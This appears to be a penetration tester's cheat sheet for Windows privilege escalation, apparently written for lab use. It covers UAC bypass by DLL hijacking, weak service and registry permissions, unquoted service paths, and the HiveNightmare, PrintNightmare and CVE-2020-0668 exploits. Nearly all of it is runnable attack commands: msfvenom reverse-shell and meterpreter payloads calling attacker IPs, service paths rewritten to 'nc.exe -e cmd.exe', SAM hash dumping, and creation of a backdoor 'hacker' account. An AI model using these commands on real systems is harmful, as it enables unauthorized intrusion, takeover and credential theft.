# UAC
Getting infomration about the UAC status

0x1 UAC active
0x0 UAC deactive
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

UAC level
0x5 popup (yes/no)
0x2 credentials (user and password)

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
Path directory
```
cmd /c echo %PATH%
```
Expected output
```
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```
Creating revshell in the following path of WindowsApps
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=6969 -f dll > srrstr.dll
```
Testing connection
```
rundll32 shell32.dll,Control_RunDLL
```
Stopping all processes
```
tasklist /svc | findstr "rundll32"
```
Execute
```
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

# Weak Permissions
Using this [tool](https://github.com/GhostPack/SharpUp/)
```
.\SharpUp.exe audit
```
See permission of this services
```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
accesschk.exe /accepteula -quvcw WindscribeService
```

Common methods:
1. Change a SecurityService.exe to a revshell with the same name
2. Change the bin path
```
sc config WindscribeService binpath="C:\tools\nc.exe -e cmd.exe 10.10.14.124 6969"
sc stop WindscribeService
sc start WindscribeService
```
3. Unquoted Service Path
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
Create a exploit for example:
- C:\Program.exe\
- C:\Program Files (x86)\System.exe

4. Permissive Registry ACLs
```
# Searching for services
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
# Exploit
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
5. Services autorun
```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

# Kernel Explotation
Reconaice tool
```
Watson.exe
```
## Hashes
See permissions
```
icacls c:\Windows\System32\config\SAM
```
Exploit
```
.\HiveNightmare.exe
or
./CVE-2021-36934.exe
```
Extract hashes
```
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```
## Spooler Service
Reconaice
```
ls \\localhost\pipe\spoolss
```
Ways to [bypass](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)
```
Set-ExecutionPolicy Bypass -Scope Process
A
```
Create a user
```
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
## Permissions on Binary
Using this [tool](https://github.com/GhostPack/SharpUp/)
```
.\SharpUp.exe audit
```
Seeing permissions
```
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
Revshell
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```
Exploit (don't care about the second name)
```
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Tools\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
Review of the exploit worked
```
icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
```
Uploading the revshell
```
copy /Y C:\Tools\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
Start system
```
net start MozillaMaintenance 
```
Get hashes
```
meterpreter > hashdump
```
